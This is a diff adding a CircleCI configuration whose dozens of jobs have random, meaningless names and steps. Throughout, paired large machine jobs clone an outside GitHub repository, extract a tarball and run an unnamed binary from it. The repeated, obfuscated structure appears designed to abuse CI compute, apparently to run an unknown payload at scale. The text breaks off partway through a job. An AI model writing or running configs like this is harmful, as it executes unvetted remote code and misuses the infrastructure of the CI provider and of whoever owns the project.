@@ -1,0 +1,1429 @@
+version: 2.1
+
+jobs:
+  momwvgdlxredizn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: aqrnfea
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'zxfvuggpcsfeucn rtwtmufigtep' > /tmp/oygltyxbc/uxjwkx
+            ls -la /tmp/oygltyxbc/uxjwkx
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'uxjwkx'
+  iiypym:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: wdufnbduzetc
+          command: |
+            du --bytes /tmp/oygltyxbc/uxjwkx || true
+      - run:
+          name: rixlknvjkmqfnyh
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: sgqqsnnycbduvyr
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  iyxzibnri:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: eexkgrzhvtvfrqa
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'mcvvcrlizczux vgjyqnmoyje' > /tmp/oygltyxbc/knoevfjmiwwzdk
+            ls -la /tmp/oygltyxbc/knoevfjmiwwzdk
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'knoevfjmiwwzdk'
+  bfqklzlvqvjfi:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: xcgdruudnwzxxk
+          command: |
+            du --bytes /tmp/oygltyxbc/knoevfjmiwwzdk || true
+      - run:
+          name: btjdvnmp
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: pefybkgkx
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  glvxeaczrhn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: errfarbgx
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'yeoyhhilfpnawme hkmmaayvvkjcmvquas' > /tmp/oygltyxbc/tamlftrmgutn
+            ls -la /tmp/oygltyxbc/tamlftrmgutn
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'tamlftrmgutn'
+  xqbaz:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ndyncuqfrmecjl
+          command: |
+            du --bytes /tmp/oygltyxbc/tamlftrmgutn || true
+      - run:
+          name: raefch
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: uhkjufgnzkfhqx
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  nklpahzbvt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: qtksgjc
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'yswbiiwivdvshth afaxtthxop' > /tmp/oygltyxbc/xjaeppcecbgeun
+            ls -la /tmp/oygltyxbc/xjaeppcecbgeun
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'xjaeppcecbgeun'
+  jszurvwbuzhfk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ooaawtam
+          command: |
+            du --bytes /tmp/oygltyxbc/xjaeppcecbgeun || true
+      - run:
+          name: lurdwzzrhnycvf
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: gmiymty
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  aqclvxxmojez:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ytagwfahvzf
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'dbybpbvtffcwwjz arsougfnlhcppjevx' > /tmp/oygltyxbc/kwnffsgbpgzm
+            ls -la /tmp/oygltyxbc/kwnffsgbpgzm
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'kwnffsgbpgzm'
+  zusggawq:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ptedvhcof
+          command: |
+            du --bytes /tmp/oygltyxbc/kwnffsgbpgzm || true
+      - run:
+          name: dfahlhm
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: kbcdqzrtdh
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  ekiup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: cpsjyrawsydh
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'awpsxweicbone ssdizzdmmzxghvanpg' > /tmp/oygltyxbc/obgdqkcc
+            ls -la /tmp/oygltyxbc/obgdqkcc
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'obgdqkcc'
+  enlxxaphnjwm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: mofdhqopbosqom
+          command: |
+            du --bytes /tmp/oygltyxbc/obgdqkcc || true
+      - run:
+          name: lmbgx
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: fimgdj
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  ptghfexjghn:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: edgwyqvnxbfckjy
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'gficbudysochav ydhzrzmfshvqfbbaa' > /tmp/oygltyxbc/tmlsox
+            ls -la /tmp/oygltyxbc/tmlsox
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'tmlsox'
+  cumkhnls:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: wgviasleaorwdy
+          command: |
+            du --bytes /tmp/oygltyxbc/tmlsox || true
+      - run:
+          name: bmkkguaogjv
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: nxnjhbkdujm
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  twzjx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: znaplqj
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'pnmawjdits naubnensctgpcdydj' > /tmp/oygltyxbc/mgyxanpfdytfg
+            ls -la /tmp/oygltyxbc/mgyxanpfdytfg
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'mgyxanpfdytfg'
+  tvuelekevuw:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: szpceji
+          command: |
+            du --bytes /tmp/oygltyxbc/mgyxanpfdytfg || true
+      - run:
+          name: yctyvvoc
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: djhgyuoqpvbvak
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  kcdzghr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: kguxjrswi
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'tkukkdewbxvxrvc umwgppkhpjriyhj' > /tmp/oygltyxbc/sbhypwfjqld
+            ls -la /tmp/oygltyxbc/sbhypwfjqld
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'sbhypwfjqld'
+  aqrqf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ouabfdggeztsnbz
+          command: |
+            du --bytes /tmp/oygltyxbc/sbhypwfjqld || true
+      - run:
+          name: vfasgxwuhbroz
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: qcvcda
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  lurmvz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: jkqtuiiykfbqaq
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'hmdhnnhulmfk aspmwbtbfxupaq' > /tmp/oygltyxbc/ghspicswip
+            ls -la /tmp/oygltyxbc/ghspicswip
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'ghspicswip'
+  zpinrnkczvwd:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ftmoyik
+          command: |
+            du --bytes /tmp/oygltyxbc/ghspicswip || true
+      - run:
+          name: zkwhmnmxkdgfwup
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: doube
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  buoydm:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: dvnnfq
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'tdpkxdslocfbeerii bxubqfsoey' > /tmp/oygltyxbc/nuhttumwz
+            ls -la /tmp/oygltyxbc/nuhttumwz
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'nuhttumwz'
+  ebctodxeuk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: piuskjdtugvvi
+          command: |
+            du --bytes /tmp/oygltyxbc/nuhttumwz || true
+      - run:
+          name: yuosgyiqpv
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: lgmezxhjbcr
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  hbdzwooyoxltk:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: sxujmpnbokhnqdu
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'kxifasssdi gceerjqzfw' > /tmp/oygltyxbc/dtiiti
+            ls -la /tmp/oygltyxbc/dtiiti
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'dtiiti'
+  lfvcsjjoifcephx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ghcazcdjqmiblri
+          command: |
+            du --bytes /tmp/oygltyxbc/dtiiti || true
+      - run:
+          name: cgltu
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: vjlekaklr
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  eblfazkh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: rjffdnocyjj
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'pycrirjwud fimyiwqmbkelgt' > /tmp/oygltyxbc/uhjwgsfeftprl
+            ls -la /tmp/oygltyxbc/uhjwgsfeftprl
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'uhjwgsfeftprl'
+  uiirahkwujlhf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: gmtrmq
+          command: |
+            du --bytes /tmp/oygltyxbc/uhjwgsfeftprl || true
+      - run:
+          name: gytheefmr
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: qjgcf
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  mdlypgbdh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: bwqnyfw
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'ttijxbkikvmq kzvigrzfqrhkxbae' > /tmp/oygltyxbc/ryhaqhk
+            ls -la /tmp/oygltyxbc/ryhaqhk
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'ryhaqhk'
+  olmacibfmigpebm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: acghilrbrqlh
+          command: |
+            du --bytes /tmp/oygltyxbc/ryhaqhk || true
+      - run:
+          name: hgvijdbyers
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: ilrufoihqtohwtr
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  sdlelxaijezofbq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: yozqvvsireylc
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'byqsmnwtfnbocy rautabzpohvq' > /tmp/oygltyxbc/vukyakp
+            ls -la /tmp/oygltyxbc/vukyakp
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'vukyakp'
+  jqbzrzhlt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: xtdibeqirc
+          command: |
+            du --bytes /tmp/oygltyxbc/vukyakp || true
+      - run:
+          name: smdbyf
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: wmfzzkfbscoq
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  qhurxolqgef:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: vmepsmb
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'cmnddkgsice kkxavhnqvfuypjo' > /tmp/oygltyxbc/ukabzx
+            ls -la /tmp/oygltyxbc/ukabzx
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'ukabzx'
+  jaxvsmcdt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: yraxoydzsbfad
+          command: |
+            du --bytes /tmp/oygltyxbc/ukabzx || true
+      - run:
+          name: lspuwijcvmitrqf
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: unyyhfahe
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  heylv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: mvtjlgbshilvvtm
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'zpfhuaualhmjt bviezsgjnptvndn' > /tmp/oygltyxbc/giyiiqpds
+            ls -la /tmp/oygltyxbc/giyiiqpds
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'giyiiqpds'
+  rrjvoohk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: xjrzjigopm
+          command: |
+            du --bytes /tmp/oygltyxbc/giyiiqpds || true
+      - run:
+          name: fiimaopmufc
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: ohedsbn
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  igrrpkbhzie:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: qzbkdtswnp
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'xbcjumwdbegtz durxkyfqqbkqdfmwh' > /tmp/oygltyxbc/duelnhahuakt
+            ls -la /tmp/oygltyxbc/duelnhahuakt
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'duelnhahuakt'
+  adkbnzhkr:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: dhykxm
+          command: |
+            du --bytes /tmp/oygltyxbc/duelnhahuakt || true
+      - run:
+          name: pzjhn
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: aabyzvtl
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  zpkukki:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: fgdfxezoymml
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'jvkdbtccyjmegdho uiozkzonbooyyoh' > /tmp/oygltyxbc/sptzkelxfxy
+            ls -la /tmp/oygltyxbc/sptzkelxfxy
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'sptzkelxfxy'
+  hwuorzk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: kzqzc
+          command: |
+            du --bytes /tmp/oygltyxbc/sptzkelxfxy || true
+      - run:
+          name: buhkojyzeizb
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: hlpmtlc
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  rkwps:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: rpcwdzguhlcifke
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'mdavrbcpbrf izyzlzhqra' > /tmp/oygltyxbc/wikhkaqrmu
+            ls -la /tmp/oygltyxbc/wikhkaqrmu
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'wikhkaqrmu'
+  owqxxwrvubwrbzy:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: okgeco
+          command: |
+            du --bytes /tmp/oygltyxbc/wikhkaqrmu || true
+      - run:
+          name: pvabcaviq
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: yamrdoxqz
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  pxgttdap:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: wbnykbap
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'gtqodcwswfdfjej pjlsxxgkyjqg' > /tmp/oygltyxbc/acglkhrk
+            ls -la /tmp/oygltyxbc/acglkhrk
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'acglkhrk'
+  htiolipsho:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: jhiqerkwunsrc
+          command: |
+            du --bytes /tmp/oygltyxbc/acglkhrk || true
+      - run:
+          name: stwhczj
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: majdtomy
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  eaanuqkbgbvirr:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: asqukn
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'hhqtincheeuxa lluysnbwuxmkrxfwh' > /tmp/oygltyxbc/qiqsstncugt
+            ls -la /tmp/oygltyxbc/qiqsstncugt
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'qiqsstncugt'
+  zsryp:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: mrzvzng
+          command: |
+            du --bytes /tmp/oygltyxbc/qiqsstncugt || true
+      - run:
+          name: gqezqvkazburisf
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: stjiansfahy
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  gxikv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ywcllckn
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'qsozzmginztkgsv ixqcsoqnhkivruof' > /tmp/oygltyxbc/qkearziyw
+            ls -la /tmp/oygltyxbc/qkearziyw
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'qkearziyw'
+  yetidguujgsx:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: ywsspu
+          command: |
+            du --bytes /tmp/oygltyxbc/qkearziyw || true
+      - run:
+          name: bqygyjqc
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: oatotmguuzb
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  qnfxhqmlombh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: wgyqhs
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'quvnkoooqfh dmfxogoxfmxzwk' > /tmp/oygltyxbc/dteoyxhj
+            ls -la /tmp/oygltyxbc/dteoyxhj
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'dteoyxhj'
+  vfkmm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: qpzupayb
+          command: |
+            du --bytes /tmp/oygltyxbc/dteoyxhj || true
+      - run:
+          name: spzwsxjgh
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: iesonleybegafh
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  fmruanlega:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: pqmllkia
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'sibffljmminmxnnqhw xwkcroifgattbakma' > /tmp/oygltyxbc/wpwfcndp
+            ls -la /tmp/oygltyxbc/wpwfcndp
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'wpwfcndp'
+  xuqnixregvk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: vzjarfxacfkm
+          command: |
+            du --bytes /tmp/oygltyxbc/wpwfcndp || true
+      - run:
+          name: pfxsdqu
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: eqsrouiwlmf
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  oswuardmynl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: whoovnhvzqxdeez
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'alljwdqnjd gcuvzyysfwtjdfjof' > /tmp/oygltyxbc/qzmmknzcpkjkug
+            ls -la /tmp/oygltyxbc/qzmmknzcpkjkug
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'qzmmknzcpkjkug'
+  qztznqaecoml:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: kogwn
+          command: |
+            du --bytes /tmp/oygltyxbc/qzmmknzcpkjkug || true
+      - run:
+          name: cfnmsbuempgj
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: ylxwq
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  khpmlfnkreamolv:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: rcwihmh
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'bvdahicphs dizksrjctm' > /tmp/oygltyxbc/feajvb
+            ls -la /tmp/oygltyxbc/feajvb
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'feajvb'
+  mvqowpmeubxka:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: urxuaijgmyugqk
+          command: |
+            du --bytes /tmp/oygltyxbc/feajvb || true
+      - run:
+          name: fsupuvtwcarcnm
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: zlbjiszmja
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  uiqqjspcfqp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: deibcvyhe
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'dunfywxazwwixqw rjvsvxyiuoba' > /tmp/oygltyxbc/fnpuzzeh
+            ls -la /tmp/oygltyxbc/fnpuzzeh
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'fnpuzzeh'
+  gzytpsrytk:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: olysispmvtr
+          command: |
+            du --bytes /tmp/oygltyxbc/fnpuzzeh || true
+      - run:
+          name: iofucrldjbxv
+          command: git clone --single-branch --no-tags https://github.com/irmabullock6o6sm-dev/6585bf024665 .
+      - run:
+          name: xfpxwodfi
+          command: tar --extract --gzip --file=odacignj.tgz
+      - run:
+          command: "$PWD/bwaedeqsaqfyyo"
+  rgjlf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: aozbpxnpoohlgrb
+          command: |
+            mkdir -p /tmp/oygltyxbc
+            echo 'kgyhafgosnif rjimhecnmfuda' > /tmp/oygltyxbc/qxwrptzu
+            ls -la /tmp/oygltyxbc/qxwrptzu
+      - persist_to_workspace:
+          root: /tmp/oygltyxbc
+          paths:
+            - 'qxwrptzu'
+  kbhwm:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/oygltyxbc
+      - run:
+          name: phcgv
+          command: |
+            du --bytes /tmp/oygltyxbc/qxwrptzu || true
+      - run:
